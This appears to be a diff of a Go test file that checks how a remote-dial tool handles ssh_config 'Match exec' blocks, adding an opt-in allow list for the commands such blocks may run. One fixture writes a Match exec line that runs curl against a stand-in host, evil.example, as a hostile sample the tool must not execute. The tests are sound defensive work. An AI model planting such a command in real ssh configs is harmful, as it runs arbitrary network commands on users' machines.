@@ -105,17 +105,17 @@ func TestDialTargetSurfacesSSHConfigOpenError(t *testing.T) {
 	}
 }
 
-// A Match block the ssh_config parser cannot evaluate used to fail every
+// A Match block the ssh_config parser cannot decide used to fail every
 // subcommand that touches a remote host with exit 2, before the host was even
 // resolved (issue #21). The block is unrelated to the target, so the dial must
 // get as far as the network.
-func TestDialTargetToleratesUnsupportedMatchBlock(t *testing.T) {
+func TestDialTargetToleratesUndecidableMatchBlock(t *testing.T) {
 	home := t.TempDir()
 	sshDir := filepath.Join(home, ".ssh")
 	if err := os.MkdirAll(sshDir, 0o700); err != nil {
 		t.Fatal(err)
 	}
-	cfg := "Match exec \"true\"\n\tStrictHostKeyChecking accept-new\n" +
+	cfg := "Match exec \"curl https://evil.example\"\n\tStrictHostKeyChecking accept-new\n" +
 		"\nHost dest\n\tHostName dest.invalid\n\tUser someone\n"
 	if err := os.WriteFile(filepath.Join(sshDir, "config"), []byte(cfg), 0o600); err != nil {
 		t.Fatal(err)
@@ -134,6 +134,42 @@ func TestDialTargetToleratesUnsupportedMatchBlock(t *testing.T) {
 	}
 	if strings.Contains(err.Error(), "Match") {
 		t.Errorf("err = %v, want no complaint about the Match block", err)
+	}
+}
+
+// -o MatchExecAllow adds to the commands a guard may run. It is the only way
+// in: the config file that names a command cannot also authorise it.
+func TestDialTargetMatchExecAllowOptIn(t *testing.T) {
+	home := t.TempDir()
+	sshDir := filepath.Join(home, ".ssh")
+	if err := os.MkdirAll(sshDir, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	cfg := "Match exec \"sleep 0\"\n\tUser fromtheblock\n" +
+		"\nHost dest\n\tHostName dest.invalid\n"
+	if err := os.WriteFile(filepath.Join(sshDir, "config"), []byte(cfg), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	env := []string{"HOME=" + home, "USER=alice"}
+
+	// The dial itself is beside the point here: cancel it so only the config
+	// handling, which runs first, is exercised.
+	dialLogs := func(opts []string) string {
+		t.Helper()
+		ctx, cancel := context.WithCancel(context.Background())
+		cancel()
+		var sb strings.Builder
+		dialTarget(ctx, "dest", nil, opts, env, func(f string, a ...any) {
+			fmt.Fprintf(&sb, f+"\n", a...)
+		})
+		return sb.String()
+	}
+
+	if got := dialLogs(nil); !strings.Contains(got, "allow list") {
+		t.Errorf("without the opt-in sleep must be refused, log was %q", got)
+	}
+	if got := dialLogs([]string{"MatchExecAllow=sleep"}); strings.Contains(got, "allow list") {
+		t.Errorf("with the opt-in sleep must be run, log was %q", got)
 	}
 }
 
